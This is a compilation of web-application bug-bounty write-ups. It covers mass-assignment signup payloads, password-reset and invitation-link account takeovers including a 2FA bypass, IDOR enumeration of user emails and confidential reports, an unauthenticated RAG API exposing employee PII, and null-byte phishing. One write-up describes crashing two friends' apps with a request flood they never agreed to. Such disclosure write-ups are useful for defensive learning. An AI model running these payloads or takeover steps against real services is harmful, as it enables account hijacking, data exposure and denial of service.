User accounts often go through “states” — e.g., pending, active, suspended, or banned. If the backend logic relies on the user model to track this state, you can try to force your account directly into an “active” state, bypassing email verification or approval queues

POST /api/v1/register
{
  "username": "status_jumper",
  "email": "jump@example.com",
  "status": "active",
  "password": "Password1!"
}

POST /api/v1/register
{
  "username": "status_jumper",
  "email": "jump@example.com",
  "state": "verified",
  "password": "Password1!"
}

POST /api/v1/register
{
  "username": "status_jumper",
  "email": "jump@example.com",
  "email_verified": true,
  "password": "Password1!"
}
OAuth & Provider Spoofing
If the application supports “Sign in with Google/Facebook,” the user model likely stores a provider ID. If you register via the normal form but inject OAuth fields, you might trick the system into linking your password-based account to a legitimate admin’s social identity (if the validation logic is flawed).

POST /api/v1/register
{
  "username": "oauth_spoof",
  "email": "spoof@example.com",
  "provider": "google",
  "provider_id": "100234234234...", // ID of a victim
  "password": "Password1!"
}

POST /api/v1/register
{
  "username": "oauth_spoof",
  "email": "spoof@example.com",
  "auth_strategy": "ldap",
  "password": "Password1!"
}
Combination payload (high-value finding)
Mixing multiple techniques is one of the most effective ways to find real vulnerabilities. Some combinations bypass incomplete validation or trigger multiple deserialization paths at once.

POST /api/v1/register
{
  "username":"combo_user",
  "email":"combo.user+test@example.com",
  "password":"Password1!",
  "__proto__": {"isAdmin": true},
  "profile": {"role":"admin"},
  "metadata": "{\"elevate\":true}"
}
Conclusion
Mass-assignment bugs occur when backends trust incoming JSON too much. A harmless-looking signup request can overwrite sensitive fields if filtering isn’t strict. Testing the payload variations above helps reveal how the API handles different structures and types. Once these gaps are found, enforcing allowlists and validating each field becomes straightforward. Securing the signup flow strengthens the entire application.

Number: 14
title:0-Click Account Takeover Through a Simple Password Reset Parameter
id: writeup

But when I tried with a random email like testhehhhehe@gmail.com, the application replied:
 “We couldn't find an account with that email address.”
That’s a classic user enumeration vulnerability.

Step 2: Looking closer at the reset link
When I checked my email,

https://redacted.com/reset-password?email=shiohz0test@gmail.com&token=O4AiLBPhZNvr

The link had two parameters:

My email address
A reset token
When I opened it, I got the usual “Create new password” page. Nothing surprising so far.


Step 3: Just a small experiment
I decided to try something simple.

Become a member
I requested another reset link for the same email (shiohz0test@gmail.com). Once I received the fresh 
link with new token , I opened it but changed only one thing the email id in the URL. Instead of my 
original email, I swapped it with another test account I owned:

https://redacted.com/reset-password?email=testshiozhy@gmail.com&token=sYrUIKzYt46
And boom!
The page loaded perfectly, and it allowed me to reset the password of testshiozhy@gmail.com.
Remember: I had never requested a reset for this second account.
The application was making a huge mistake. It trusted the email parameter directly from the URL and did 
not validate whether the reset token truly belonged to that email. This mismatch allowed me to reset the
password of another user without their involvement

So with just one token (that I got for my own 

Number : 14 
title: Publicly Exposed RAG API Leading to Unauthenticated Access to PII and Internal System Data
id: writeup

Discovery Through Shodan
Shodan often reveals systems that organizations may not realize are exposed. While searching 
for common patterns related to development servers and machine learning pipelines, one specific
IP caught my eye because port 8081 was showing an active HTTP service. The banner looked interesting 
enough to analyze further, so I opened the address directly in a browser.

I also verified the response through curl:
curl http://[REDACTED]:8081/

The moment it loaded, it displayed a message saying:

{"message": "RAG Pipeline API is running"}
This indicated the server was meant to support some form of AI-related backend workflow. 
But more importantly, the page loaded without any authentication. This is unusual for a system that 
appears to be part of an internal backend pipeline.

At this point, the intention was still simple observation. But the lack of authentication hinted there 
could be more exposed behind the scenes.

Finding the OpenAPI Documentation
Many modern APIs include an automatically generated documentation file often exposed at /openapi.json or /swagger.json.While testing standard API documentation paths, /openapi.json responded with 200, exposing the entire API structure.

On this server, visiting:

http://[REDACTED]:8081/openapi.json
returned the complete OpenAPI specification.

This file alone contained hundreds of lines describing every endpoint, method, parameter, request structure, and expected response. It was effectively a full map of the system, including internal administrative routes.

The fact that this documentation was left publicly accessible already showed that the system lacked even basic restrictions.

Extracting All Endpoints
To better understand the API surface, I extracted all the paths from the OpenAPI file.

curl -s http://[REDACTED]:8081/openapi.json | jq '.paths | keys[]'
And then cleaned the output:

curl -s http://[REDACTED]:8081/openapi.json | jq -r '.paths | keys[]'
The result was a very large set of routes covering everything from authentication and dashboards
to file management and user details.

What stood out immediately was that the API was not just for a specific module. It included customer
and lead management, employee operations,
device tracking, dashboard analytics, file uploads and downloads, session controls, system and server status,
GDPR-related features, and notification systems.

This was clearly a production-grade system containing real organizational data.

Manual Testing of Endpoints
With a complete list of endpoints available, the next logical step was to open a few in the browser 
or with curl to verify whether they required authentication. Most secure systems would respond with either
an authentication error or a redirect to a login page.

However, this system responded with full JSON data.

The first endpoint tested was the user listing route:

curl http://[REDACTED]:8081/api/v1/users
It immediately returned a long list of user entries containing:

Full names
Email addresses
Mobile numbers
User roles
Login and logout timestamps
Presence indicators
Account creation times
This was concrete, real user information belonging to employees and admins. Browsing through the data revealed dozens 
of individuals, each with identifiable personal data. None of it was protected.

Number: 15
title: Account Takeover via IDOR in GraphQL Invitation Flow
id:
Lets assume the target as redacted, just like any other SaaS environment.

From the UI perspective the flow was extremely simple. There was an Invite Agents button.
I as evil.com was the owner of team and could invite agents/members in my team.

Clicking it opened a modal where I could enter one or more email addresses and send invites. This is a very common feature, 
so at this point nothing felt interesting or suspicious.
After entering an email of victim victim1234@gmail.com and clicking Invite, I switched my focus to Burp Suite. 
The application was using GraphQL, so instead of multiple REST endpoints everything was going through a single /graphql endpoint.
The request being sent looked like a standard GraphQL mutation.

The intercepted request looked like this:

POST /graphql/ HTTP/2
Host: redacted
Content-Type: application/json
{
 "operationName":"InviteAgentsFromInviteAgentModal",
 "query":"mutation InviteAgentsFromInviteAgentModal($emails: [String!]!) { inviteAgents(emails: $emails) 
{ success message invitations { id email __typename } failedEmailInvitations __typename } }",
 "variables":{
 "emails":["victim1234@gmail.com"]
 }
}

At first glance this looked harmless. I was simply inviting an email and the server was expected to send an 
invitation email. But then I looked at the response.
The server responded with the following JSON:

{
  "data": {
    "inviteAgents": {
      "success": true,
      "message": "Successfully invited agents",
      "invitations": [
        {
          "id": "4ffacc07efdecea45dc4a0f1c4a704e9d1",
          "email": "victim1234@gmail.com"
        }
      ],
      "failedEmailInvitations": []
    }
  }
}

That id immediately caught my attention. This was not just some internal identifier. 
I had seen similar looking values before in activation links. 
So instead of ignoring it, I copied the id and tried to understand where it was used.

From previous testing experience, I knew that invited users usually activate their accounts using a 
URL that looks something like /signup/activate/<token>. Previously I invited myself and the URL was like

https://[REDACTED]/signup/activate/eb3b13efdec3415384a0f1c4a773f576

So till /signup/activate/ it was static and we only need to change token. I replace the token that was received in response.
To my surprise, this took me straight to the account activation page. The page asked me to set a name and password for the account.
There was no requirement to click a link from the mailbox (Because we already got the token from response).
I filled in the details and set name as hacked account and submitted the form. The account was successfully created.

Press enter or click to view image in full size
The invited email now appeared as an active agent inside my team. The display name was exactly what I had entered 
during activation. At no point did I need access to the victim’s email inbox. Everything worked purely because the 
application exposed the activation token in the GraphQL response and trusted that token without any additional validation.

Lessons learned
Not every ID is harmless. If an identifier can change account state, it must be treated as a secret.
Email based flows must enforce proof of ownership on the server side, not just trust a token.
GraphQL responses can silently leak sensitive data if fields are exposed without strict review.
IDOR issues often appear when applications trust exposed identifiers without proper validation or scoping.

Number: 15
title: How a Simple Business Logic Flaw Caused an Account Lockout DoS
id: writeup

Hitting a Dead End in User Enumeration
The first weird behavior that I encountered was on the registration page itself. 
If an already registered email address was entered, a unique error message would appear,
which gave me the idea of user enumeration. The problem was that if an email did not exist,
the system would create a new account. If I automated this process, I could potentially end up
creating thousands of accounts — which I’m sure actual email owners wouldn’t be too happy about

Overcoming The Dead End
Nevertheless, I started thinking of ways to enumerate users without creating a new account every 
time an email did not exist. By default, when creating an account, a POST request was sent that 
looked something like this:

POST /Register/Username
Host: redacted.com

Email=user@gmail.com&Password=test

Out of curiosity I decided to remove “/Username” and add it as a custom parameter in the body of the request:

POST /Register/
Host: redacted.com

Username=Test&Email=user@gmail.com&Password=test

The result was that I could create accounts with custom usernames. It wasn’t anything particularly
important, but the fact that an account using the username “Test” was already created meant that no 
other account could use the same username. Then I wondered — what would happen if I resent the same 
request but changed the Email parameter to one that already exists in the system?

POST /Register
Host: redacted.com

Username=Test&Email=new@gmail.com&Password=test

Surprisingly, the response to this request contained only one error: that the username was already taken. 
This meant that if an email address didn’t exist, the system would not create a new account,
preventing the flooding issue that had been my problem before. With this, I finally had a reliable 
way to enumerate existing accounts!

Next Step
This alone wasn’t much of a vulnerability, and I knew it had to be chained with something else to 
raise the impact. While playing with the functionality of the application, I observed something interesting: 
after five failed login attempts at an account, the account gets locked for several minutes, with no way for 
the owner to unlock it until the lockout period passes. The problem was that, despite the lockout, 
it was still possible to send invalid login attempts directly via the API, which meant the account 
remained locked until requests stopped being sent.

Account Lockout DoS
That seemed very peculiar to me, but I assumed there would be some rate limiting in place to prevent abuse. 
It turned out I was wrong — there was no rate limit whatsoever. In simple terms, an attacker could continuously 
send invalid login attempts, keeping the account locked indefinitely, or at least until he decides to stop the attack.

Combining Pieces
Combined with the account enumeration issue, it was possible to identify valid email addresses and then launch a lockout 
attack, keeping users out of their accounts with no way to log back in.

Number: 16
# How a Simple Misconfiguration in the Invitation Link Led Me to Full Account Takeover
id: write up

The Initial Discovery
In the beginning, let’s assume the target is target.com. On this platform, you can create an organization, manage it, and 
invite people with different permissions. What we will focus on is the Invitation Link.

invitation link
When you invite someone to your organization, you send them a link. If the user doesn’t have an account, 
clicking the link automatically creates one for them. However, the problem arose when the invited person 
already had an existing account. When they clicked the link, it logged them into their account directly!

What is the normal scenario for an invitation link?
Usually, when a person opens an invite, they should be prompted to enter their password first — not be 
granted immediate access. Furthermore.

Second Issue: Reusable Invitation Link
The second problem is that the invitation link is not single-use.

It can be used an unlimited number of times It remains valid even after the user accepts or rejects the invitation 
The link never expires This introduces a serious security risk.

What Happens If the Link Is Leaked?

Now let’s ask an important question:What if the invitation link is leaked or obtained by an attacker in any way?

The result is simple and dangerous:

The attacker gets direct access to the victim’s account without:
Email
Password
Any authentication step
Just the link = full login access.
This scenario is exactly the same as the one that led me to my first bounty You can read that write-up here:


Bypassing Two-Factor Authentication (2FA)
After publishing that write-up, some people told me:

You should have tested whether the invitation link also bypasses 2FA

Unfortunately, at that time the vulnerability was already fixed, so I couldn’t test it.

But now, I had a very similar vulnerability, so I decided to try again.

I went to the account settings and enabled Two-Factor Authentication.

The process was standard:

The application generated a QR code
I scanned it using an Authenticator app (like Google Authenticator)
The app started generating time-based one-time passwords (TOTP) that change every few seconds
After confirming the code, 2FA was successfully enabled

Enable 2FA
After enabling 2FA, I opened the invitation link again.
And here came the surprise:
The invitation link bypasses 2FA as well.
So even if the victim believes their account is secured with two-factor authentication,
the invitation link has a different opinion.

The Most Interesting Part
At this point, I asked myself:

If the invitation link eventually expires (for example after 2–3 days),
how can I make my access to the account persistent, even after the link is no longer valid?

The first thing I thought about was whether I could change the victim’s email to my own email and then completely
remove the victim’s email, which would result in full account takeover.

So I navigated to the email change settings and added my own email address.

However, things did not go as expected. The application did not remove the victim’s email. Instead, 
it added my email as a secondary, unverified email and sent the email verification link to the victim’s email address.

The UI clearly showed that:
The victim’s email was still the primary and verified email
My email was listed as a secondary and Not confirmed email
As a result, the first attempt failed.

The Second thing I thought about was:
Some applications allow users to change the account password without requiring the current password, so I went to check 
this behavior in the account settings. However, this application required entering the current password first, which means
this approach was not applicable in this case.

I thought to myself:
Why not try response manipulation using Burp’s Match & Replace?
But first, I wanted to understand how the application verifies an email address.
So, I went to the account settings, refreshed the page, intercepted the request, and analyzed the response. I noticed the following:

Victim’s email → "isPrimary": true, "validatedAt": "2025-12-…"
My email → "isPrimary": false, "validatedAt": null
Now, let’s try response manipulation.

The idea was to modify the response by swapping the email values, making my email appear in place of the victim’s email, and the 
victim’s email appear in place of mine.

I navigated to Burp Proxy → Match & Replace,
selected Response body,
then placed the original response in field (5),
and the modified response in field (6).

I set up the match/replace rules and refreshed the page.

And here was the surprise

The UI now showed:

My email → Primary & Verified
Victim’s email → Not confirmed

Now my email is primary and victim’s email is Not confirmed now so I tried removing the victim’s email.
Unfortunately, it failed and returned an error.

Back to the ”Hero Image”
Do you remember the image I told you to remember?

Yes — the Change Password section.

There is an option:
“reset”

If you forget your current password, the application can send you a reset link, allowing you to set a new password again.

I asked myself:

If the UI shows my email as the primary one,
where will the password reset link be sent?

Bingo

I clicked Reset.

Then I opened my Gmail.
And here was the surprise
The password reset link for the victim’s account was sent to MY email. Not the victim’s.

This revealed another vulnerability:

Response Manipulation leading to Password Reset Hijacking
— — — — — — — — — — — — — — — — — — — — — — — — — — — — — — — —

Completing the Takeover
I set a new password.

Now I asked myself:

Is my email verified permanently, or is this temporary?

Because if it’s not permanent, the victim could reset the password again and lock me out.

I checked the settings.

The victim’s email was still present, but:

My email now showed as Verified

jfjxxxx@gmail.com ==> victim’s email

faysxxxxx@gmail.com ==> my email

Adrenaline…
I then:
Set my email as the primary email and it worked!
Removed the victim’s email successfully!
Disabled 2FA (it required the password, which I now had)

Full Account Takeover Achieved
At this point:

Victim’s email → removed
2FA → disabled
Password → controlled by attacker
Account → fully owned

Number: 17
title: The Simple Bug That Led Me to My First Bounty (Account Takeover via Insecure Reusable Activation Link)
id: write 

The Discovery Phase

The vulnerability was quite simple initially, but it’s the kind of detail many people often overlook in application logic.

Let’s call the target website `target.com`.
When I created a new account, the application sent an Activation Link to my email to verify the account.
I clicked the link, and it immediately logged me into my account.

Note: I spent some time understanding the site’s overall workflow, which took me a full day due to its size and the number of 
functions available. Understanding the Business Logic is crucial.

The next day, I was ready to start testing. I created another account and received the activation link.
I clicked it, and I was logged in immediately.

My mind paused: “Why was I logged in directly? Shouldn’t the link’s sole purpose be account verification, not granting a session?”

Standard Security Practice: An activation link should ideally be single-use. Its job is to change the account state from “unverified” 
to “verified” and then it should expire immediately.

Confirming the Vulnerability:
I tried opening the exact same activation link again.
The Surprise: It logged me into my account again!
This was the vulnerability: Every time I opened the activation link, it granted me direct access to the account. The activation link was 
functioning as a persistent, passwordless session token.

I quickly wrote the report, highlighting that the link was reusable and automatically logged the user in.

One day later, the security team responded:

This response was a direct confirmation of the issue! The security team focused on the 48-hour expiration but ignored the core problem:

Reusability: The link can be used more than once.
Automatic Login: The link not only verifies but also authenticates the user.
These two factors combined transform a simple activation link into a 48-hour Account Takeover vulnerability!

Here is the summary of the follow-up I sent to clarify the security impact:

After my detailed follow-up explaining the real security impact, they reopened the report and set the status to Under Review.

Seven days later, the surprise came: The vulnerability was accepted, and I was rewarded!

The Takeaway:

Always focus on the Business Logic and how the application is supposed to work securely. Small details in the workflow often 
lead to critical bugs. If your report is initially rejected, don’t give up — clearly articulate the Impact and the exploitation 
scenario with logical, security-focused reasoning.

Number: 18
title: A Simple IDOR That Ignored Platform Logic
id: writeup

Let’s assume the target as redacted , just like any housing rental application.

I had two advertisements under my account (one is Online and another is Offline). Interestingly, both advertisements had the same name :)
The first advertisement was named Test 12 test with an iguana picture. This one was online and available for rent. (I was also testing EXIF metadata ^_^).

The second advertisement was also named Test 12 test, but this one had a Starbucks picture and was offline, meaning it was not available for rent. 
(If I clicked the “FOR RENT” button on it, it would become online and available again.)

Now, when I tried visiting the publicly accessible URL of the offline advertisement: https://redacted/best/test_12_test/109

It loads successfully, but at top right, It showed an error saying:

“This housing is occupied....”
Nothing serious. Totally expected. Everything looked normal so far.

After that, I visited the advertisement that was available for rent: https://redacted/best/test_12_test/107
Here, I noticed something interesting. This page had an option called “Go to Message”, which was not present on the offline advertisement.
Okay, fair enough.

So I clicked on “Go to Message” to message the landlord and intercepted the request in Burp Suite. At first glance, it was a completely normal request. 
But one thing immediately caught my attention.
There was a parameter called advertisement_id=107 This ID clearly belonged to the online advertisement (yes, the iguana picture one).

As expected, I was able to send a message to the landlord of the available advertisement without any issue.

But this is where curiosity kicked in. I started wondering…
What if I change this advertisement_id to the one that belongs to the offline advertisement?
Press enter or click to view image in full size

We already know that advertisement IDs were visible directly in the URL, and they were sequential 
and incremental, which meant they could be easily guessed or brute-forced.

So I decided to change the value of advertisement_id from 107 → 109 and sent the request again.

I was redirected to the chat interface.
I was able to successfully message the landlord of an advertisement that was not available for rent.
In other words, the backend never validated whether the advertisement was online or offline before allowing the message action.

To confirm the impact, I did some additional testing using Intruder and was able to message multiple landlords whose advertisements were not available for rent.

This confirm the presence of IDOR vulnerability.

Lessons Learned
Always test backend behavior, not just what the UI allows or blocks
Sequential and predictable IDs are a huge red flag, never ignore them
Hidden buttons do not mean hidden functionality
Curiosity is key. One parameter changing often leads to the full bug

Number: 19
title: How I found a Race condition on Like Function 
id: Writeup 

Identifying the Issue
While digging into the application, I tried many different things like Privilege Escalation, Broken Authentication, and SQL Injection, but none of them worked. Then, once I saw the Like Function, I quickly decided to test for a race condition

Steps to Reproduce
Upload a photo once uploaded.
Open the intercept and click on the like button.
After capturing the request for the like, send it to the repeater and duplicate the request like 20 or 30 times.
Then, send them all as a single packet attack.

and BOOOM!!
Impact
This was a High vulnerability because the application was focusing on creating images and videos , and rating this images / videos

Number: 20
title: From 403 Forbidden to $$$$ How a Simple Extension Bypass Led to Unauthenticated Access to Private Documents
id: writrup

The target was a private HackerOne program that allows users to create organizations, upload documents, and share them naturally, 
documents created inside an organization are expected to be private by default, accessible only to authenticated and authorized users. 
Since the platform handles internal files (documents, images, reports, etc.), access control plays a critical role.
I decided to focus my testing on direct access to uploaded files.

## Initial Testing:

After identifying a document uploaded inside an organization, I tried accessing it directly via its URL: `https://target.com/folder/folder/this-secret-file`
The result was exactly what I expected: `403 Forbidden — You don’t have access`
I repeated the same test with different file extensions: `.png | .docx | .csv | etc..` All requests were blocked with a `403 Forbidden`.
At this point, the access control seemed solid.

## Trying One More Thing:

Before moving on, I decided to test the same request from a completely unauthenticated context (incognito browser) just to eliminate any session-related behavior. 
and guess what `Still blocked.`Then, almost as a last check, I tried something simple:
I appended a `.pdf` extension to the same file path.
`https://target.com/folder/folder/this-secret-file.pdf ` <=== (incognito browser)
This time, the response was different.
Instead of 403 Forbidden, the server returned 200 OK, and the file content loaded successfully — without authentication.

Number: 21
title: Double-Door IDOR Exposing 85k+ Emails
id: medium writeup

The Story Begins: An Innocent Email Verify Page
It all started normally.

I signed up on the website https://redacted/user/signup, and it redirected me to a standard page: https://redacted/user/checkEmail/61250 
with text “Almost done! Confirm your email address”

Everything looked routine as this mean we have to first verify email before creating account, until I glanced at 
the URL: /user/checkEmail/61250 . A simple numeric user ID :)

Curious, I changed the ID from 61250 → 61249 and you know I let my intrusive thoughts win.

To my surprise, the page didn’t break.
Instead, it displayed another user’s email confirmation page including their email address.

I keep testing and discovered more than 60k+ Emails are you know these are incremental and guessable.

The platform was exposing all user emails by simply changing ID numbers.

Within minutes it became obvious that:

IDs were sequential
Emails of every user were accessible
Even administrative emails appeared
No login was required
No rate limiting
No restrictions

Part Two: A 404 Page That Leaks Everything
I was exploring a totally unrelated platform.
I logged into my account at: https://redacted/login and in my profile I could click my email address and it redirected to me to page with URL:

https://redacted/user/26720/printable
The page responded with: “Pagina niet gevonden” (Page not found)

But the breadcrumb above the page told a very different story:

Home » myemail@gmail.com » Page not found

The user’s email address was displayed… (In this case it was mine) on a 404 page…

I again look for the URL and it shows /user/checkEmail/61250 . A simple numeric user ID :)

I again let my intrusive thoughts win and I changed the ID from 26720 → 26719

Again the emails of all users were leaked.

This was an interesting because page show “No Found” error but it display the email and from here around 25k+ Email leaked.

I responsibly documented and reported the vulnerabilities to the clients and got fixed.

Number: 22
title: From a Single ID to Confidential Report Disclosure — Breaking Patterns in a Real Bug Bounty
id: medium writeup

Understanding the Application Flow
Before diving into the actual bug, it’s important to understand how this application handles vulnerability reporting.

When a researcher reports a vulnerability via email, the team creates an internal issue inside their web application — essentially a ticketing system. Each report is assigned an issue ID, and a dedicated page is generated to track the entire lifecycle of that report.

This issue page maintains:

The complete communication history
Status updates
Uploaded evidence files such as screenshots, text files, and PDFs
Each issue can be accessed through a URL like:

/common/issue-tracking.php?id=228

From there, all associated evidence files are loaded dynamically from internal endpoints. This flow is meant to centralize reporting and make collaboration easier — but it also becomes a critical attack surface if access controls are not handled correctly.

Once I understood this workflow, I started looking at how deeply these report resources were protected.

From a Simple ID to Something Much Bigger
The first thing that caught my attention was how easily the id parameter could be decoded.

The value looked complex at first glance — a long hexadecimal string — but when decoded as ASCII Hex in Burp Suite, it immediately turned into readable characters.

Not hashes.
Not random bytes.
Just structured text.

That alone was enough to slow me down and look closer.

A Target Worth Revisiting
I had worked on this target before.
Earlier reports included things like stored XSS and a 2FA misconfiguration. After some time passed, I decided to revisit it with fresh eyes.

It was late at night — the kind of time when you stop rushing and start noticing things others miss.

The application’s reporting flow was straightforward:
If you report a vulnerability via email, the team creates an issue internally in their web application. Each report gets a ticket-like page that contains the full history of communication along with uploaded evidence.

Those reports were accessible via a URL like:

/common/issue-tracking.php?id=228

Naturally, the first thing I checked on this endpoint was for a classic IDOR issue. After testing it properly, it was clear that simple ID manipulation wasn’t working and there was no direct IDOR vulnerability. Instead of forcing it further, I went back to my own old report and reviewed the original email thread, where the same issue-tracking URL was referenced.

That’s when I decided to dig deeper — not horizontally, but vertically.

Where Evidence Files Changed Everything
Inside the report page, I noticed that all uploaded evidence files — images, text files, PDFs — were being loaded from a different endpoint:

/common/admin/issue-tracking/file.php?id=585b243672692442373b4d4d2b33327c707b737428517b6c73266d3423747d6f364d3823255d3a

The id parameter here looked encoded, not random.

I copied it straight into Burp Decoder and decoded it as ASCII Hex.

The result:

X[$6ri$B7;MM+32|p{st(Q{ls&m4#t}o6M8#%]:

At first glance, it looked messy — capital letters, lowercase letters, numbers, special characters — everything mixed together.

But I didn’t stop there.

Press enter or click to view image in full size

Decoded to ASCII Hex
The Pattern Starts to Appear
I checked another evidence file URL from the same report:

/common/admin/issue-tracking/file.php?id=565b243672692442373b4d4b2b33327c707b737428517b6c73266d3423747d6f364d3823255d36

Decoded:

V[$6ri$B7;MK+32|p{st(Q{ls&m4#t}o6M8#%]6

Now things started to get interesting.

Become a member
Comparing the two decoded values, only four parts were changing:

The first capital letter (R → V)
Two capital letters in the middle (NE→ RM)
The last character (+ → 6)
Everything else stayed exactly the same
That’s not randomness.
That’s structure.

To be sure, I checked one more evidence file:

/common/admin/issue-tracking/file.php?id=545b243672692442373b4d492b33327c707b737428517b6c73266d3423747d6f364d3823255d32

Decoded value:

T[$6ri$B7;MI+32|p{st(Q{ls&m4#t}o6M8#%]2

At this point, the pattern was undeniable.

Press enter or click to view image in full size

Understanding of Pattern
Automating the Curiosity
Once the pattern was clear, manual testing no longer made sense.

I wrote a Python script that:

Bruteforced only the four variable positions
Re-encoded each generated value back into ASCII Hex
Sent requests to the file endpoint automatically
Logged responses that didn’t match known invalid patterns
This wasn’t blind brute force — it was constrained enumeration, guided by structure.

I also checked archives like Wayback to see if the endpoint had been indexed before. Nothing useful came up. But honestly, that didn’t matter.

Sensitive data should never rely on obscurity alone.

In bug bounty, unlike pentesting, theoretical issues rarely get accepted. You need to show real-world impact.

So I let the script run.

Press enter or click to view image in full size

Successfully got some other Valid IDs
When the Script Started Talking Back
The script began returning valid responses.

And when I manually visited those URLs…

I was looking at other researchers’ reports.

Full PDFs.
Screenshots.
Internal vulnerability details.

No authentication.
No authorization.
Just a predictable pattern and an exposed endpoint.

At that moment, the issue stopped being “interesting” and became serious.

This wasn’t just a bug.
It was a direct compromise of the platform’s confidentiality.

Press enter or click to view image in full size

Successfully downloaded other User’s Report
Why This Matters
This wasn’t about breaking encryption.
This wasn’t about brute force.

It was about noticing that something meant to look complex was actually predictable — and that no access control stood in the way.

Confidential vulnerability reports are some of the most sensitive assets a platform has. Exposing them undermines trust, disclosure integrity, and user safety.

Final Thoughts
Whenever you see encoded values, don’t assume they’re secure.

Try decoding them:

Sometimes Burp’s built-in decoders are enough
Sometimes tools like hashes.com or crackstation.net help
And sometimes… it’s just ASCII Hex hiding in plain sight
Most bugs aren’t hidden.
They’re right in front of us.

We just need to change how we look at them.

Number: 23
title: BAC = $$$
id: medium writeup

The Discovery…

While exploring the application, a feature looks interesting to me
In the policy section, the admin can set restrictions so that only the admin is allowed to view other users' emails
I enabled the feature and checked the UI, and the emails of other users within the organization have disappeared
Next, I checked the API response, and it’s doing its job perfectly
but I know there might be another endpoint that could expose the emails, I started exploring chat section but found nothing

The application has a call feature that allows any user in the organization including non-admins to call other users
While analyzing the requests, I noticed that an endpoint exposes the email

Steps to Reproduce

In the administrator account, go to the settings
and configure the policy so that only administrators can view other users’ email addresses.
From the user account (non-admin), initiate a voice or video call to any member
Inspect the captured traffic and observe the request
POST /_chat/v2/users/<id>/call where the admins or user’s email address is exposed by the API.

Number: 24
title: $500 for a UUID Swap: I Almost Gave Up on This IDOR
id: Medium writeup

The Program
This company provides an application that can best be described as a modern-day password manager. 
A key feature of the app is the ability to add a trusted device, which allows users to bypass OTP 
verification during the login process on that specific device.

The vulnerability
There is an API endpoint to retrieve information about our own Trusted device. This endpoint takes our 
account’s UUID and returns the device’s information. There was an IDOR vulnerability in this API that allowed
an attacker to retrieve device info belonging to other users in the same tenant


JS Recon to Discover More
I have to admit; I had initially given up on finding an IDOR. However, while attempting to execute a separate attack, 
I began reviewing the JavaScript to identify all admin-related requests (those directed to /api/v3/admin/*). During this
process, I stumbled upon an endpoint that got me thinking. This specific endpoint is triggered when clicking on a user with 
whom you have shared a password, and it returns limited information such as their name and role.

#different endpoint to return limited member info
/api/v3/members/<UUID>/account/info
So, I thought: if ../account/info returns only limited account details, what happens when I change things up a bit?

The Exploit
Nothing too complex, I simply recooked the API endpoint into one that pulls another member’s Trusted device information, and it worked.

#reworked endpoint to return another member's device info
/api/v3/members/<UUID>/trusted-devices/info
By substituting another user’s UUID into that endpoint, I was able to retrieve their device information. The disclosure included their User-Agent,
IP address, and several cryptographic keys.

As for the UUIDs themselves, they were leaked throughout the application. For example, when a registered user shares a credential set with you, 
their unique UUID is exposed within the share link.

Impact and Payment
The major impact here was the leakage of other member’s external IPs and cryptographic keys. I reported this as a High but was bullied into settling for a Medium gang.

Number: 25
title: Email Body Truncation via Null Byte Injection
id: medium writeup

The program I was testing, let’s call it X, is a web application that allows users to create notes and share them via email with anyone, 
whether they are signed up on X or not. After creating a note and sharing it with my second email address, I received a message that looked like this:

As you might be thinking right now, since the email contains my name (which I can set to any text I want) and the note name, I decided to try HTML Injection
by changing my name to <h1>HTML</h1> and doing the same for the note name; unfortunately, it didn’t work because the web application was correctly performing 
HTML encoding on the email content before sending it.

Later, I tried setting my name to special characters that can be interpreted differently by various programming technologies, changing it to 
something like “’`\@!?”<H1>Test</H1>, then I invited my second email to the note again, but this time something weird happened because I didn’t 
receive an email at all!
I initially thought the application might have a rate limit on sending emails to avoid spam, perhaps only allowing an invitation email to be sent 
again after 5 minutes to the same email, or something similar to that. To check this, I changed my name back to a normal English name and invited 
my second email to the note again. Surprisingly, I received the email immediately. After trying this several times in a short duration and always 
receiving the email, I realized that something in the previous name (“’`@!?”<h1>Test</h1>) was causing an exception when the web application tried 
to send the invitation email.

I began deleting characters one by one to understand what exactly was triggering the exception, so I deleted > first, then /, but I still received 
nothing until I finally deleted \. When I invited my second email after removing the backslash, I finally received the email, which led me to believe
the server was interpreting \ as a special character; I immediately thought of Unicode escape characters, which allow us to represent any characters as
text using the format: \uXXXX.

Become a member
To test this hypothesis, I changed my name to \u0061 (which represents the character a) and invited my second email, and as I expected, the email body
contained a as my name instead of \u0061:

Press enter or click to view image in full size

This confirmed that \uXXXX was being interpreted by the application back-end into its corresponding Unicode character (whether it was printable like a
or non-printable like control characters), so knowing this, the next logical step was to try \u0000, which represents a null byte that is known to signify 
the end of a string in C-like programming languages; after I did that, I received an empty email because the email starts with my account name (\u0000), and 
since the null byte was interpreted as the end of the email body string, it truncated everything after it:

Press enter or click to view image in full size
To demonstrate the impact of this vulnerability, I changed my name to a phishing message that ends with \u0000:
In order to access the “Secret” note, you must confirm your identity — Please complete the verification at the following link: https://by-0xcyborg.com/login\u0000
The result looked like this:
Press enter or click to view image in full size
So, the final impact was that I could use the company’s official, verified email address to send an email containing any text I wanted to any recipient.

Number: 26
title: DoS on a live streaming and chatting App (Ethically).
id: Medium

Recon
I downloaded the application from the Play Store (10M+ downloads) and began using it as a normal user. Each user on the platform 
is assigned a sequential, numeric-only User ID: newer accounts have seven-digit IDs, 
while older accounts have six digits. Using these IDs, users can view profiles, send messages, join rooms, or engage with agencies.
I searched for a web version of the application but found that only verified users had access to a browser-based interface. At that time, 
I was unable to intercept Android traffic, so I shifted my focus to identifying any web endpoints that might directly interact with the Android application.

Using a simple Google dork with wildcard searches, I discovered numerous endpoints. After reviewing many of them, I found one particularly interesting endpoint:
/request-for-agency/user. This endpoint accepted a User ID and, in response, triggered a verification code delivered to the system notifications section inside 
the Android app. By submitting multiple requests like more than ten times , I confirmed that each request sends a new verification code.

This became entry point for me .

Lets Exploit
I already had an idea in my mind, and this was the right moment to test it. The first thing I needed to check was whether the endpoint had any rate limiting.
Luckily, it did not. So I wrote a small Python script that kept sending the same request again and again, more than a thousand parallel requests, just to see 
what would happen. I put my own User ID in the script and ran it.

Within seconds, my phone was flooded with verification codes. The system notifications were coming in so fast that I could not even pull down the notification 
panel. After about two minutes, the real impact showed up. The app started throwing NULL errors in every section and finally crashed completely. I could not 
join any rooms or broadcasts, I could not view profiles, and even my own profile stopped loading. This confirmed that the exploit worked exactly as I expected. 
As User IDs were sequential and numeric only , it was very easy to crash every user on platform just with simple automation.

At that point, I asked my two friends for their User IDs. They thought I was going to join them in their broadcast, but instead I ran the script on both of their 
accounts. Their apps crashed in the same way, and the only method to recover was to delete the app and create new accounts. Then i was able to sleep good.

As a Ethical Hacker , Yes I reported this to platform’s security team and provided my friend’s accounts as PoC.

